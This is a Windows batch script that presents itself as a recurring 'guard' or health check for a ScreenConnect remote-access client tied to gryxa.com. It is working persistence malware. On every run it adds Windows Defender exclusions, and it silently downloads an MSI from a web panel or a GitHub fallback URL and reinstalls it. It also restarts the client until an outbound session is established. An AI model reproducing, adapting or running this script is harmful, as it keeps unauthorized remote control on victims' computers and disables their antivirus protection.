@echo off
rem WINRTCS_GUARD 0.0.1 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback). Exclusions + reinstall only.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "LOG=%ZD%\guard.log"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME%>>"%LOG%"

rem --- AV shields (re-asserted every run): wildcard path covers any FP dir current+future ---
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect Client (*)'; Get-ChildItem 'C:\Program Files (x86)' -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { Add-MpPreference -ExclusionPath $_.FullName; $exe = Join-Path $_.FullName 'ScreenConnect.ClientService.exe'; if (Test-Path $exe) { Add-MpPreference -ExclusionProcess $exe } }" >nul 2>&1

call :Detect
if not defined GSVC (
  echo [%DATE% %TIME%] gryxa_absent>>"%LOG%"
  goto :Install
)

sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] svc_stopped start_attempt !GSVC!>>"%LOG%"
  sc start "!GSVC!" >nul 2>&1
  timeout /t 8 /nobreak >nul 2>&1
  sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
  if errorlevel 1 (
    echo [%DATE% %TIME%] start_fail_reinstall>>"%LOG%"
    goto :Install
  )
)

call :Session
if defined GUP (
  echo [%DATE% %TIME%] healthy !GSVC!>>"%LOG%"
  endlocal & exit /b 0
)

rem --- zombie: RUNNING but no established session -> restart once, recheck, else reinstall ---
echo [%DATE% %TIME%] zombie_restart !GSVC!>>"%LOG%"
sc stop "!GSVC!" >nul 2>&1
timeout /t 4 /nobreak >nul 2>&1
sc start "!GSVC!" >nul 2>&1
timeout /t 15 /nobreak >nul 2>&1
call :Session
if defined GUP (
  echo [%DATE% %TIME%] healthy_after_restart !GSVC!>>"%LOG%"
  endlocal & exit /b 0
)
echo [%DATE% %TIME%] zombie_persist_reinstall>>"%LOG%"

:Install
set "MSI=%ZD%\gryxa_install.msi"
set "SRC=ui"
del /f /q "%MSI%" >nul 2>&1
echo [%DATE% %TIME%] fetch_ui>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%MSI%" "%UI%" >nul 2>&1
if not exist "%MSI%" goto :RepoFetch
for %%F in ("%MSI%") do if %%~zF LSS 5000000 ( del /f /q "%MSI%" >nul 2>&1 & goto :RepoFetch )
goto :DoInstall

:RepoFetch
set "SRC=repo"
echo [%DATE% %TIME%] fetch_repo_fallback>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%MSI%" ( echo [%DATE% %TIME%] FAIL_no_msi_source>>"%LOG%" & endlocal & exit /b 1 )
for %%F in ("%MSI%") do if %%~zF LSS 5000000 ( echo [%DATE% %TIME%] FAIL_msi_small>>"%LOG%" & del /f /q "%MSI%" >nul 2>&1 & endlocal & exit /b 1 )

:DoInstall
echo [%DATE% %TIME%] msi_install src=!SRC!>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart /l*v "%ZD%\msi_gryxa_install.log" >nul 2>&1
echo [%DATE% %TIME%] msiexec_exit=!errorlevel!>>"%LOG%"
set "W=0"
:WaitSvc
timeout /t 5 /nobreak >nul 2>&1
call :Detect
if defined GSVC (
  sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
  if not errorlevel 1 goto :WaitSession
)
set /a W+=1
if !W! LSS 12 goto :WaitSvc
echo [%DATE% %TIME%] FAIL_svc_not_running>>"%LOG%"
endlocal & exit /b 1

:WaitSession
set "W=0"
:WaitSess
timeout /t 5 /nobreak >nul 2>&1
call :Session
if defined GUP (
  echo [%DATE% %TIME%] installed_verified !GSVC! src=!SRC!>>"%LOG%"
  del /f /q "%MSI%" >nul 2>&1
  endlocal & exit /b 0
)
set /a W+=1
if !W! LSS 6 goto :WaitSess
echo [%DATE% %TIME%] installed_no_session_yet !GSVC! src=!SRC!>>"%LOG%"
del /f /q "%MSI%" >nul 2>&1
endlocal & exit /b 0

:Detect
set "GSVC="
for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
  for /f "tokens=* delims= " %%S in ("%%A") do (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 set "GSVC=%%S"
  )
)
exit /b 0

:Session
set "GUP="
set "GPID="
if not defined GSVC exit /b 0
for /f "tokens=3" %%P in ('sc queryex "!GSVC!" 2^>nul ^| findstr /C:"PID"') do set "GPID=%%P"
if not defined GPID exit /b 0
if "!GPID!"=="0" exit /b 0
netstat -ano 2>nul | findstr /C:"ESTABLISHED" | findstr /E /C:" !GPID!" >nul 2>&1
if not errorlevel 1 set "GUP=1"
exit /b 0
